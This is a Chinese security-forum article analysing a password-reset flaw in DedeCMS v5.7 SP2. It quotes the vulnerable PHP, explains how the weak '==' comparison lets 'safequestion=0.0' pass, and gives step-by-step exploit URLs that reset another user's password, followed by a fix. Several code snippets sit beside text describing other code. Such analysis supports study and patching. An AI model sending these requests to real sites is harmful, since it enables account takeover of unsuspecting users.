> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XemaVZtNwzpOyzG7f0LKcA)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDujMPCNh6EyYn8gDtIibwFtXUIaIPROEErwlOgQOrGjHNYFIJE74JC1gQ/640?wx_fmt=jpeg)  

本文为看雪论坛优秀文章

看雪论坛作者 ID：H3h3QAQ

```
<?php

require_once(dirname(__FILE__)."/config.php");

require_once(DEDEMEMBER."/inc/inc_pwd_functions.php");

if(empty($dopost)) $dopost = "";

$id = isset($id)? intval($id) : 0;
```

dedecms v5.7 可以在前台进行任意修改前台用户密码。

```
if($dopost == "")
{
    include(dirname(__FILE__)."/templets/resetpassword.htm");
}
elseif($dopost == "getpwd")
{
 
    //验证验证码
    if(!isset($vdcode)) $vdcode = '';
 
    $svali = GetCkVdValue();
    if(strtolower($vdcode) != $svali || $svali=='')
    {
        ResetVdValue();
        ShowMsg("对不起，验证码输入错误！","-1");
        exit();
    }
 
    //验证邮箱，用户名
    if(empty($mail) && empty($userid))
    {
        showmsg('对不起，请输入用户名或邮箱', '-1');
        exit;
    } else if (!preg_match("#(.*)@(.*)\.(.*)#", $mail))
    {
        showmsg('对不起，请输入正确的邮箱格式', '-1');
        exit;
    } else if (CheckUserID($userid, '', false) != 'ok')
    {
        ShowMsg("你输入的用户名 {$userid} 不合法！","-1");
        exit();
    }
    $member = member($mail, $userid);
```

DedeCMS v5.7 SP2

```
//以邮件方式取回密码；
    if($type == 1)
    {
        //判断系统邮件服务是否开启
        if($cfg_sendmail_bysmtp == "Y")
        {
            sn($member['mid'],$userid,$member['email']);
        }else
        {
            showmsg('对不起邮件服务暂未开启，请联系管理员', 'login.php');
            exit();
        }
 
        //以安全问题取回密码；
    } else if ($type == 2)
    {
        if($member['safequestion'] == 0)
        {
            showmsg('对不起您尚未设置安全密码，请通过邮件方式重设密码', 'login.php');
            exit;
        }
        require_once(dirname(__FILE__)."/templets/resetpassword3.htm");
    }
    exit();
}
else if($dopost == "safequestion")
{
    $mid = preg_replace("#[^0-9]#", "", $id);
    $sql = "SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'";
    $row = $db->GetOne($sql);
    if(empty($safequestion)) $safequestion = '';
 
    if(empty($safeanswer)) $safeanswer = '';
 
    if ($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer) {
        sn($mid, $row['userid'], $row['email'], 'N');
        exit();
    }
    else
    {
        ShowMsg("对不起，您的安全问题或答案回答错误","-1");
        exit();
    }
 
}
```

在 / member/resetpasswordd.php，定义了整个密码的充值过程，我们来分析一下：

```
1、邮件方式：首先会检测邮件服务是否开启如果开启则发送邮件，否则给出提示信息
2、安全问题：检测是否有设置安全问题，如果有则重定向到密码重置的第三步，否则给出提示
```

在源码的开头处包含进行了一些配置文件以及功能函数文件，之后接受了一个 id 变量，用来查询用户：

```
if ($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer)
```

之后检查了 dopost 是否为空，如果为空则重定向到密码重置，若不空则在这里进行匹配，当 dopost 为 getpwd 则对用户输入的验证码、邮箱、用户名进行合法校验。

接着往下看：

```
'0.0'=0
```

在这里会首先判断找回密码的方式，这里一共提供了两种：

```
function sn($mid,$userid,$mailto, $send = 'Y')
{
    global $db;
    $tptim= (60*10);
    $dtime = time();
    $sql = "SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'";
    $row = $db->GetOne($sql);
    if(!is_array($row))
    {
        //发送新邮件；
        newmail($mid,$userid,$mailto,'INSERT',$send);
    }
    //10分钟后可以再次发送新验证码；
    elseif($dtime - $tptim > $row['mailtime'])
    {
        newmail($mid,$userid,$mailto,'UPDATE',$send);
    }
    //重新发送新的验证码确认邮件；
    else
    {
        return ShowMsg('对不起，请10分钟后再重新申请', 'login.php');
    }
}
```

我们仔细看这一行代码：

```
function newmail($mid, $userid, $mailto, $type, $send)
{
    global $db,$cfg_adminemail,$cfg_webname,$cfg_basehost,$cfg_memberurl;
    $mailtime = time();
    $randval = random(8);
    $mailtitle = $cfg_webname.":密码修改";
    $mailto = $mailto;
    $headers = "From: ".$cfg_adminemail."\r\nReply-To: $cfg_adminemail";
    $mailbody = "亲爱的".$userid."：\r\n您好！感谢您使用".$cfg_webname."网。\r\n".$cfg_webname."应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\r\n本次临时登陆密码为：".$randval." 请于三天内登陆下面网址确认修改。\r\n".$cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&id=".$mid;
    if($type == 'INSERT')
    {
        $key = md5($randval);
        $sql = "INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES ('$mid', '$userid',  '$key', '$mailtime');";
        if($db->ExecuteNoneQuery($sql))
        {
            if($send == 'Y')
            {
                sendmail($mailto,$mailtitle,$mailbody,$headers);
                return ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php','','5000');
            } else if ($send == 'N')
            {
                return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&id=".$mid."&key=".$randval);
            }
        }
        else
        {
            return ShowMsg('对不起修改失败，请联系管理员', 'login.php');
        }
    }
    elseif($type == 'UPDATE')
    {
        $key = md5($randval);
        $sql = "UPDATE `#@__pwd_tmp` SET `pwd` = '$key',mailtime = '$mailtime'  WHERE `mid` ='$mid';";
        if($db->ExecuteNoneQuery($sql))
        {
            if($send == 'Y')
            {
                sendmail($mailto,$mailtitle,$mailbody,$headers);
                ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php');
            }
            elseif($send == 'N')
            {
                return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&id=".$mid."&key=".$randval);
            }
        }
        else
        {
            ShowMsg('对不起修改失败，请与管理员联系', 'login.php');
        }
    }
}
```

**此处的比较是利用 "=="，弱类型比较。**

该漏洞的触发点在于以安全问题找回密码时的不安全性逻辑设计所导致的，所以我们根据流程进入到以 "安全问题" 找回密码的逻辑代码中继续分析，可以看到这里会根据之前传递进来的用户 id 作为参数从数据库查询对应的 safequestion、safeanswer，之后于用户提供的 safequestion 以及 safeanswer 进行判断。

如果用户没有设置安全问题，数据库里存储的 safequestion 默认为 "0"，safeanswer 默认为'null'，在此处我们可以利用弱类型转换构造成立，例如：

```
elseif($send == 'N')
    {
    return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&id=".$mid."&key=".$randval);
    }
```

我们可以测试一下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuHoZHxJxrjJ5sEdnaugibmFicRVNrrkFarQmNGmziasBiaoiaoNEvevZxuicg/640?wx_fmt=png)

可以看到返回值为 true。

我们来跟进 sn 函数：

```
http://url/member/resetpassword.php?dopost=safequestion&safequestion=0.0&id=3
```

在该函数中会首先进行初始化赋值操作 (此处的 send 为上面传递进来的'N')，之后跟进传递的 id 进行一次 sql 查询，之后进行判断，在这里我们直接根据 newmail 查看发送邮件的函数具体实现。

```
http://url/member/resetpassword.php?dopost=safequestion&safequestion=0.0&id=3&key=mcuxN2QB
```

注意这里：

```
elseif($send == 'N')
    {
    return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&id=".$mid."&key=".$randval);
    }
```

可以看到当 send 为'N'时，直接在前端页面返回了验证码，又因为用户 id 是我们可以控制的 safequestion 下可以绕过，那么也就达成了修改前台任意用户密码的攻击。  

```
三




漏洞复现
```

这里我准备了两个账号：

攻击者：test\test id=2

被攻击者：test2\1 id=3

第一步：我们登录到攻击者的账号。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDugMR6pICtDQX4azkmqB9JOFT1m3wiadicIA8ZzV7TBqicQv8CkNogew2iaA/640?wx_fmt=png)

第二步：抓包发送以下请求获取 key 值

```
http://url/member/resetpassword.php?dopost=safequestion&safequestion=0.0&id=3
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuOwZyN37u06iccSRxib83vkbxczMerRZf3eco85qxAyFt5LudjzkgibXcQ/640?wx_fmt=png)  

第三步：利用 key 去进行重置密码，访问 url：

```
http://url/member/resetpassword.php?dopost=safequestion&safequestion=0.0&id=3&key=mcuxN2QB
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDunQb54EqloYPk9RIcOyEQEqJQGrbL8c7EokO7NyoFzlS2cafgLMOmVA/640?wx_fmt=png)

可以看到成功跳转到了被攻击者的密码找回，我们将其密码改为 hacker

登陆验证一下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDuVWMmmiaECD0iar9231c4JQgFCjZIib0t1GUKHQoAktB8bLgiacA7bGP25w/640?wx_fmt=png)

登陆成功，完成了密码修改。

```
四




漏洞修复
```

1、将 if ($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer) 中的 "==" 更换 "==="

2、及时升级系统到最新版本

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDu5jHcE3icLsvCatN93lPF8tIWibiaFq2JicibZic7YN10JVaWwSxkic1prV8RA/640?wx_fmt=png)

  

**看雪 ID：H3h3QAQ**

https://bbs.pediy.com/user-home-921448.htm

* 本文由看雪论坛 H3h3QAQ 原创，转载请注明来自看雪社区

[![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Eqic51RIXYMYyr8uCAmQoDubsFXxyY3Ho3cdR2wngOXH6zbZEVTzspwK7pxktkxv93fmA5Eib7pYlw/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458489324&idx=3&sn=3643f4f46671c220cbede17182f292d5&chksm=b18ea16686f9287098b2a18599b60fc790b66c114880203b7956a913ad3e2e1d3cdfc9f8a2e7&scene=21#wechat_redirect)

**#** **往期推荐**

1.[CVE-2022-21882 提权漏洞学习笔记](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458471430&idx=1&sn=6a47d0c5c8f3f6204548e80977ecd059&chksm=b18e7c8c86f9f59a88d9b8e83c8297e0ef65034a73436998ab835531baadaa51f3d630793b95&scene=21#wechat_redirect)  

2.[wibu 证书 - 初探](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458471429&idx=1&sn=a85188de9b9697fd1b9e708bb8bb1fdb&chksm=b18e7c8f86f9f59933d6cbf0040ed796f06e37b23f17f1ae842eb22257de02338e1a8d751f6b&scene=21#wechat_redirect)

3.[win10 1909 逆向之 APIC 中断和实验](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458471421&idx=2&sn=e83cf7220dc1c4c06a2efc78593e30cc&chksm=b18e7b7786f9f2614ecce34e23be7f71a3d3516766aabda8f25ae41c81ef359a2c245503cf86&scene=21#wechat_redirect)

4.[EMET 下 EAF 机制分析以及模拟实现](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458468723&idx=2&sn=5a830d04185d80e1b6cfa639dc6c6c15&chksm=b18e71f986f9f8ef5b3c2fec51f69751e63a5d6bdbadf43b49728ba05606fc4ac63fda378c92&scene=21#wechat_redirect)

5.[sql 注入学习分享](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458468108&idx=1&sn=42c8ec155e13e3882cf4aeb60cdbb982&chksm=b18e0f8686f98690c9792298abb04dd243862ff8effd545dc668c7b1c682aaacf9797d899e97&scene=21#wechat_redirect)

6.[V8 Array.prototype.concat 函数出现过的 issues 和他们的 POC 们](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458468074&idx=2&sn=06eb27c1649bd4e3a3e43a46a9500add&chksm=b18e0e6086f9877644ba0de33658232f99213d1b1b074342260031cb529c1b7ad1b89b2e0204&scene=21#wechat_redirect)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif)

**球分享**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif)

**球点赞**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif)

**球在看**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicd7icG69uHMQX9DaOnSPpTgamYf9cLw1XbJLEGr5Eic62BdV6TRKCjWVSQ/640?wx_fmt=gif)

点击 “阅读原文”，了解更多！